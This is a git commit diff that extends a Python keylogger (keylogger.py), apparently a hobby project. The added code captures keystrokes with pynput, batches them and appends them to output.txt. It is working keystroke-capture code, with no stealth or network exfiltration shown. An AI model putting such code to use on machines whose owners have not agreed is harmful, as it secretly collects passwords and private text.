3a3ca97806e2e8a6808c1920068cc032a4b03f89
Krineshs <shsh_krinesh@yahoo.co.nz>
2022-07-17 00:28:11 +1200

    improved keylogger
    Functioning output.txt file

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,34 @@
 from pynput.keyboard import Key, Listener
 
+count = 0
+keys = []
+
 
 def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
     print("{0} pressed".format(key))
+
+    if count >= 20:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    with open("output.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+              f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
 
 
 def on_release(key):
-    if key == Key.esc:
+    if key == Key.esc:  # Escape to exit
         return False
 
 
